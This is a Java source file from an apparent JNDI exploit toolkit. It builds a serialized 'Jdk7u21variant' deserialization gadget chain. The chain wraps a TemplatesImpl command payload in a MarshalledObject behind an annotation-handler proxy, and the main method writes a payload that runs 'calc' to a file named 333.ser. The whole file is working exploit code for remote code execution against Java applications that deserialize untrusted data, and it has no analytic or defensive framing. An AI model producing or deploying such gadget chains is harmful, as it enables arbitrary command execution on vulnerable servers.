package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.utils.Gadgets;
import com.nu1r.jndi.gadgets.utils.Reflections;

import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.InvocationHandler;
import java.rmi.MarshalledObject;
import java.util.HashMap;
import java.util.LinkedHashSet;

public class Jdk7u21variant {

    public static void main(String[] args) throws Exception {
        byte[]           bytes = getBytes(PayloadType.command, "calc");
        FileOutputStream fous  = new FileOutputStream("333.ser");
        fous.write(bytes);
        fous.close();
    }

    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
        Object templates = Gadgets.createTemplatesImpl(type, param);
        String zeroHashCodeStr = "f5a5a608";

        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "foo");

        InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
        Reflections.setFieldValue(tempHandler, "type", Templates.class);
        Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);

        LinkedHashSet set = new LinkedHashSet();
        set.add(templates);
        set.add(proxy);

        Reflections.setFieldValue(templates, "_auxClasses", null);
        Reflections.setFieldValue(templates, "_class", null);

        map.put(zeroHashCodeStr, templates);

        MarshalledObject marshalledObject = new MarshalledObject(set);
        Reflections.setFieldValue(tempHandler, "type", MarshalledObject.class);

        set = new LinkedHashSet(); // maintain order
        set.add(marshalledObject);
        set.add(proxy);
        map.put(zeroHashCodeStr, marshalledObject); // swap in real object

        //序列化
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
        oos.writeObject(set);
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }
}
